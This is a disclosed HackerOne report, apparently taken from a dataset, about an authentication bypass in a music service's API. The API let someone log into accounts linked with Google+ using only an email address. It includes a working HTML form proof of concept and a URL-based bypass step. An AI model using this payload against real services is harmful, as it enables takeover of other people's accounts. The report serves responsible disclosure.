---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '86504'
original_report_id: '86504'
title: '[CRITICAL] Login To Any Account Linked With Google+ With Email Only'
weakness: Privilege Escalation
team_handle: anghami
created_at: '2015-09-01T15:08:44.057Z'
disclosed_at: '2015-10-02T23:54:35.464Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 4
tags:
- hackerone
- privilege-escalation
---

# [CRITICAL] Login To Any Account Linked With Google+ With Email Only

## Metadata

- HackerOne Report ID: 86504
- Weakness: Privilege Escalation
- Program: anghami
- Disclosed At: 2015-10-02T23:54:35.464Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hello,
This is **CRITICAL** .. I Can Login To Any Account Linked With Google+ With Email Only And Without  Password!!
##PoC:
```html
<form action="https://api.anghami.com/gateway.php" method="POST">
  <input type="hidden" name="m" value="gop">
  <input type="hidden" name="u" value="victim@email.com">  <!-- Victim's Email-->
  <input type="hidden" name="p" value="">
  <input type="hidden" name="type" value="authenticate">
  <input type="hidden" name="lang" value="en">
  <input type="hidden" name="language" value="en">
  
  <input type="submit">
</form>
```
And To Make This PoC Work .. You Have To Follow The Same Bypass in My Previous Report [#86428](https://hackerone.com/reports/86428).
If Your Page URL is `http://localhost/login.html` Make IT Look Like `http://localhost/login.html?https://play.anghami.com/login`.
Submit The Form .. And You'll Be In The Victim Account.

Please Let Me Know If You Need a Video To Help You Reproduce This Vulnerability.

Best Regards,
Ebram Marzouk

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
